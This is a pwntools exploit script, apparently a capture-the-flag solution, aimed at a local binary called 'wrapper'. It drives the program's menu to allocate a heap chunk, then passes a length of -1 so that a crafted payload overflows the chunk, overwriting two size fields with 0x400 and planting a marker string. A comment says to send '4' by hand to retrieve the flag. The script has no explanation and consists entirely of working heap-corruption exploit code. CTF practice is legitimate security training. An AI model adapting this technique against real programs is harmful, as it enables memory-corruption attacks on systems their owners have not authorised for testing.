#!/usr/bin/env python

#from pwn import context, ELF
from pwn import *
elf = context.binary = ELF('./wrapper')
libc = elf.libc

p = elf.process()

#===================Helper_Functions====================#

def malloc(size):
    p.sendline('1')
    p.sendline(f"{size}")

def realloc(index, size):
    p.sendline('2')
    p.sendline(f"{index}")
    p.sendline(f"{size}")

def corrupt(index, payload):
    p.sendline('3')
    p.sendline(f"{index}")
    p.sendline("-1")
    p.sendline(payload)


#====================Exploit===========================#

malloc(30)
payload = b"A" * 32 + p64(0x400) + p64(0x400) + b"Ez W" + p8(0x0) + b"F" * 20
corrupt(0, payload)

# Send '4' manually on interactive prompt to retrieve flag.
# For some reason this doesn't work through pwntools
#p.sendline('4')

p.interactive()
